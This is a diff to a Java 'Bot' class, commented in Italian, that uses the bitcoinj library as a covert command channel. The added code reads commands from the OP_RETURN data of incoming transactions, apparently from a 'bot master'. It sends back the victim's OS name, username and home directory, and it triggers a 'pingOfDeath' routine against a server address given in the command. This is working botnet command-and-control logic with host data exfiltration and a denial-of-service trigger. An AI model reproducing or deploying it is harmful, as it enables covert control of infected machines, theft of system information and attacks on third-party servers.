@@ -51,7 +51,8 @@ public class Bot {
         // Download the block chain and wait until it's done.
         kit.startAsync();
         kit.awaitRunning();
-
+        
+        
         // We want to know when we receive money.
         kit.wallet().addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
             @Override
@@ -177,6 +178,7 @@ public class Bot {
                 }
             }
         });
+        
 
          list = kit.wallet().getWatchedAddresses();
         if (list.size() < 1) {
@@ -200,6 +202,65 @@ public class Bot {
         //registerBot(myAddress);
         
        // pingOfDeath();
+        
+        /*
+         * Controlliamo se l'ultima transazione del wallet del bot
+         * è quella ricevuta dal bot master.
+         * Se è così il bot deve inviare la risposta al bot master
+         */
+        List<Transaction> trans = kit.wallet().getRecentTransactions(1, false);
+        for (Transaction t: trans) {
+        	System.out.println(t.toString());
+        	String messaggio=readOpReturn(t);
+			
+        	String[] v=messaggio.split("-");
+			String comando=v[0];
+			String serverAddress="";
+        	
+			System.out.println(comando);
+			
+			String addressString=v[1];
+				
+			if (v.length>2)
+				serverAddress=v[2];
+			
+			Address address=new Address(params,addressString);
+				
+        	/*
+        	 * Se il campo op return è uno dei seguenti:
+        	 * - ping
+        	 * - os
+        	 * - username
+        	 * - userhome
+        	 * - ping_of_death
+        	 * 
+        	 * Allora rispondi al bot master qui
+        	 * ATTENZIONE: bisogna cambiare i nomi delle risposte ai comandi 
+        	 * che il bot invia al bot master perchè si confondono con quelli 
+        	 * che invia il bot Master
+        	 */
+			if (kit.wallet().getBalance().isGreaterThan(Coin.MILLICOIN))
+	        	switch (comando) {
+					case "ping":
+						sendCommand("ping_ok-"+list.get(0).toString(), address);
+						break;
+					case "os":
+						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
+	                 break;
+					case "username":
+						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
+						break;
+					case "userhome":
+						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
+						break;
+					case "pingOfDeath":
+						String risultato=pingOfDeath(serverAddress);
+					sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
+					default:
+						break;
+					}
+   
+        }
         
         
         try {
@@ -243,7 +304,8 @@ public class Bot {
 		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
 	
 		SendRequest sendRequest = SendRequest.forTx(transaction);
-
+		sendRequest.feePerKb = Coin.ZERO;
+		
 		String string = new String(hash);
 		System.out.println("Sending ... " +string);
     	
